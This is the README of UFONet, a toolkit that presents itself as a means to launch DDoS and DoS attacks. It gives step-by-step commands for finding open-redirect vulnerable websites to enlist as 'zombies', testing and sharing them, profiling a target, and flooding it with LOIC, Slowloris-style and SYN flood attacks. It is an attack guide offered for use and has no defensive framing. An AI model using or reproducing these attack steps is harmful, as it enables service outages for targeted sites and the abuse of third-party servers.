=========================================================================== 

888     888 8888888888 .d88888b.  888b    888          888    
888     888 888        d88PY888b  8888b   888          888    
888     888 888       888     888 88888b  888          888    
888     888 8888888   888     888 888Y88b 888  .d88b.  888888 
888     888 888       888     888 888 Y88b888 d8P  Y8b 888    
888     888 888       888     888 888  Y88888 88888888 888    
Y88b. .d88P 888       Y88b. .d88P 888   Y8888 Y8b.     Y88b.  
 'Y88888P'  888        'Y88888P'  888    Y888  'Y8888   'Y8888

=========================================================================== 

Welcome to UFONet [ DDoS+DoS ] Botnet/C&C/Darknet ;-)

===========================================================================

###############################
# Project info
###############################

- Website: 

   https://ufonet.03c8.net

- IRC: 

   irc.freenode.net - #ufonet

###############################
# FAQ
###############################

   https://ufonet.03c8.net/FAQ.html

###############################
# Summary
###############################

UFONet - is a toolkit designed to launch DDoS and DoS attacks.

See these links for more info:

   - CWE-601:Open Redirect: 
     http://cwe.mitre.org/data/definitions/601.html

   - OWASP:URL Redirector Abuse: 
     https://www.owasp.org/index.php/OWASP_Periodic_Table_of_Vulnerabilities_-_URL_Redirector_Abuse2

###############################
# Installing
###############################

UFONet runs on many platforms. It requires Python (>2.7.9) and the following libraries:

     python-pycurl - Python bindings to libcurl
     python-geoip  - Python bindings for the GeoIP IP-to-country resolver library
     python-whois  - Python module for retrieving WHOIS information - Python 2
     python-crypto - Cryptographic algorithms and protocols for Python
     python-requests - elegant and simple HTTP library for Python2, built for human beings
     python-scapy - Packet generator/sniffer and network scanner/discovery

You can automatically get all required libraries using:

     python setup.py install

For manual installation on Debian-based systems (ex: Ubuntu), run: 

     sudo apt-get install python-pycurl python-geoip python-whois python-crypto python-requests python-scapy

On other systems such as: Kali, Ubuntu, ArchLinux, ParrotSec, Fedora, etc... also run:

     pip install geoip 
     pip install requests
     pip install pycrypto

Source libs:

     * Python: https://www.python.org/downloads/
     * PyCurl: http://pycurl.sourceforge.net/
     * PyGeoIP: https://pypi.python.org/pypi/GeoIP/
     * PyWhois: https://pypi.python.org/pypi/whois
     * PyCrypto: https://pypi.python.org/pypi/pycrypto
     * PyRequests: https://pypi.python.org/pypi/requests
     * PyScapy: https://pypi.org/project/scapy/
     * Leaflet: http://leafletjs.com/ (provided)

###############################
# Searching for 'zombies'
###############################

UFONet can dig on different search engines results to find possible 'Open Redirect' vulnerable sites. 

A common query string should be like this:

        'proxy.php?url='
        'check.cgi?url='
        'checklink?uri='
        'validator?uri='

For example, you can begin a search with:

       ./ufonet -s 'proxy.php?url='

Or providing a list of "dorks" from a file:

       ./ufonet --sd 'botnet/dorks.txt'

By default UFONet will use a search engine called 'Yahoo'. But you can choose a different one:

       ./ufonet -s 'proxy.php?url=' --se 'bing'

This is the list of available search engines with last time that they were working:

        - bing [26/09/2018: OK!]
        - yahoo [26/09/2018: OK!]

You can also search massively using all search engines supported:

       ./ufonet -s 'proxy.php?url=' --sa 

To control how many 'zombies' recieved from the search engines reports you can use:

       ./ufonet --sd 'botnet/dorks.txt' --sa --sn 20

Or you can make the tool to search for the maximun number of results automatically (this may take time!):

       ./ufonet --auto-search

At the end of the process, you will be asked if you want to check the list retrieved to see 
if the urls are vulnerable.

       Want to check if they are valid zombies? (Y/n)

Also, you will be asked to update the list adding automatically only the 'vulnerable' web apps.

       Want to update your list? (Y/n)

If your answer is 'Y', your new 'zombies' will be appended to the file named: zombies.txt

  -------------
  Examples:

     + with verbose:       ./ufonet -s 'proxy.php?url=' -v
     + with threads:       ./ufonet --sd 'botnet/dorks.txt' --sa --threads 100

###############################
# Testing botnet
###############################

UFONet can test if your 'zombies' are vulnerable and can be used for attacking tasks. 

For example, open 'botnet/zombies.txt' (or another file) and create a list of possible 'zombies'. 
Remember that urls of the 'zombies' should be like this:

       http://target.com/check?uri=

After that, launch:

       ./ufonet -t 'botnet/zombies.txt'

You can test for XML-RPC Pingback vulnerability related 'zombies', with:

       ./ufonet --test-rpc

To check if your 'zombies' are still infected testing the whole botnet (this may take time!) try this:

       ./ufonet --test-all

And to check if your 'zombies' are still online run:

       ./ufonet --test-offline

Finally, you can order your 'zombies' to attack you and see how they reply to your needs using:

       ./ufonet --attack-me 

At the end of the process, you will be asked if you want to check the list retrieved to see 
if the urls are vulnerable.

       Want to check if they are valid zombies? (Y/n)

If your answer is 'Y', the file: "botnet/zombies.txt" will be updated.

  -------------
  Examples:

     + with verbose:        ./ufonet -t 'botnet/zombies.txt' -v
     + with proxy TOR:      ./ufonet -t 'botnet/zombies.txt' --proxy="http://127.0.0.1:8118"
     + with threads:        ./ufonet -t 'botnet/zombies.txt' --threads 50

     + test whole botnet:   ./ufonet --test-all
     + test XML-RPCs:       ./ufonet --test-rpc
     + search for offlines: ./ufonet --test-offline 
     + attack yourself:     ./ufonet --attack-me

###############################
# Inspecting a target
###############################

UFONet can search for biggest file on your target by crawlering it:

       ./ufonet -i http://target.com

You can use this before to attack to be more effective.

       ./ufonet -a http://target.com -b "/biggest_file_on_target.xxx"

  -------------
  Example:

    +input:

       ./ufonet -i http://target.com

    +output:

       [...]

        +Image found: images/wizard.jpg
	(Size: 63798 Bytes)
	------------
	+Style (.css) found: fonts.css
	(Size: 20448 Bytes)
	------------
	+Webpage (.php) found: contact.php
	(Size: 2483 Bytes)
	------------
	+Webpage (.php) found: about.php
	(Size: 1945 Bytes)
	------------
	+Webpage (.php) found: license.php
	(Size: 1996 Bytes)
	------------
	================================================================================
	=Biggest File: http://target.com/images/wizard.jpg
	================================================================================
  -------------

###############################
# Abducting a target
###############################

UFONet can provide you some interesting information about your target:

       ./ufonet -x http://target.com

  -------------
  Example:

    +input:

       ./ufonet -x https://yahoo.com

    +output:

       [...]

       -Target URL: https://yahoo.com 
       -IP    : 206.190.39.42
       -IPv6  : OFF
       -Port  : 443
       -Domain: yahoo.com

       -Bytes in : 550.09 KB
       -Load time: 9.10 seconds

       -Banner: ATS
       -Vía   : http/1.1 usproxy3.fp.ne1.yahoo.com (ApacheTrafficServer), 
                http/1.1 media-router-fp25.prod.media.ir2.yahoo.com (ApacheTrafficServer [cMsSf ]) 

       -WAF/IDS: FIREWALL NOT PRESENT (or not discovered yet)! ;-)

       -Reports:

        + CVE-2017-7671 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7671
        + CVE-2017-5660 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5660
        
        [...]

        ---------
        [Info] Abduction finished... ;-)

   -------------

###############################
# Attacking a target
###############################

UFONet can attack your target in many different ways.

For example, enter a target to attack with a number of rounds:

       ./ufonet -a http://target.com -r 10

On this example UFONet will attack the target a number of 10 times for each 'zombie'. That means that 
if you have a list of 1.000 'zombies' it will launch 1.000 'zombies' x 10 rounds = 10.000 requests to the target.

If you don't put any round it will apply only 1 by default.

Additionally, you can choose a place to recharge on target's site. For example, a large image, 
a big size file or a flash movie. In some scenarios where targets doesn't use cache systems 
this will make the attack more effective.

       ./ufonet -a http://target.com -b "/images/big_size_image.jpg"

  -------------
  Examples:

     + with verbose:     ./ufonet -a http://target.com -r 10 -v
     + with proxy TOR:   ./ufonet -a http://target.com -r 10 --proxy="http://127.0.0.1:8118"
     + with a place:     ./ufonet -a http://target.com -r 10 -b "/images/big_size_image.jpg"
     + with threads:     ./ufonet -a http://target.com -r 10 --threads 500

###############################
# Special attacks
###############################

UFONet uses different ways to exploit 'Open Redirect' vulnerabilities.

You can use UFONet to stress database on target by requesting random valid strings as search queries:

       ./ufonet -a http://target.com --db "search.php?q="

Also, it exploits (by default) XML-RPC Pingback Vulnerability, generating callback requests and increasing 
processing required by target.

You can test your list of 'XML-RPCs zombies' launching:

     ./ufonet --test-rpc

At same time, you can connect LOIC (with proxy support), to make a determinate number of recursive requests 
directly to your target:

     ./ufonet -a http://target.com --loic 100

You can connect LORIS to make requests leave open threads on the target too, making the web server 
work slower:

     ./ufonet -a http://target.com --loris 100

And you can connect UFOSYN (it requires 'root' access) to start a powerful TCP/SYN flood attack:

     sudo python ufonet -a http://target.com --ufosyn 100

Both ways could be combined, so UFONet can attack DDoS and DoS, at the same time:

     ./python ufonet -a http://target.com --loic 100 --loris 100

     sudo python ufonet -a http://target.com --loic 100 --loris 100 --ufosyn 100

###############################
# Updating
###############################

UFONet has implemented an option to update the tool to the latest stable version.

This feature can be used only if you have cloned it from a git respository.

To check your version you should launch:

       ./ufonet --update

This will update the tool automatically removing all files from old package.

###############################
# Generating a 'Blackhole'
###############################

UFONet has some P2P options to share/keep 'zombies' with other 'motherships'.
      
  * Setup web server with a folder "ufonet", this folder should be: 

    - located in /var/www/ufonet (default debian/ubuntu install)
    - owned by the user running the blackhole
    - accessible with http://your-ip/ufonet/

  * Start the blackhole with: ./ufonet --blackhole (or python2 blackhole.py)

  * Anyone wanting to connect to your server needs to set the --up-to/--down-from 
    to the ip address of your webserver...

  [!]WARNING : this *ADVANCED* function is *NOT* secure, proceed if you really want to.

To start a new 'blackhole' launch:

       ./ufonet --blackhole

###############################
# GUI/Web Interface
###############################

You can manage UFONet using a Web Interface. The tool has implemented a python web server 
connected to the core providing you a more user friendly experience.

To launch it use:

      ./ufonet --gui

This will open a tab on your default browser with all features of the tool and some 'extra' options:

 - NEWS: Allows to read last "news" published by a "mothership"
 - MISSIONS: Allows to read last "missions" published by a "mothership"
 - SHIP STATS: Allows to review statistics from your "spaceship"
 - BOARD: Allows to send/receive messages to/from a "mothership" (a forum)
 - WARPS: Allows to interact with a "mothership" to download/upload "zombies"
 - GLOBAL GRID: Allows to review statistics from other "spaceships"
 - WARGAMES: Allows to propose and join some real "wargames"

###############################
# Timelog
###############################

--------------------------
26.09.2018 : v.1.1
--------------------------

--------------------------
08.03.2018 : v.1.0
--------------------------

--------------------------
14.07.2017 : v.0.9b
--------------------------

--------------------------
21.10.2016 : v.0.8b
--------------------------

--------------------------
17.08.2016 : v.0.7b
--------------------------

--------------------------
05.11.2015 : v.0.6b
--------------------------

--------------------------
24.05.2015 : v.0.5b
--------------------------

--------------------------
15.12.2014 : v.0.4b
--------------------------

--------------------------
27.09.2014 : v.0.3.1b
--------------------------

--------------------------
20.09.2014 : v.0.3b
--------------------------

--------------------------
22.06.2013 : v.0.2b
--------------------------

--------------------------
18.06.2013 : v.0.1b
--------------------------

###############################
# Thanks to
###############################

- UFo & Mandingo & Ikujam
- Phineas Fisher ;-)
- The Shadow Brokers (TSB) ;_)
- World Wide Antifas >-)
-------------------------

############
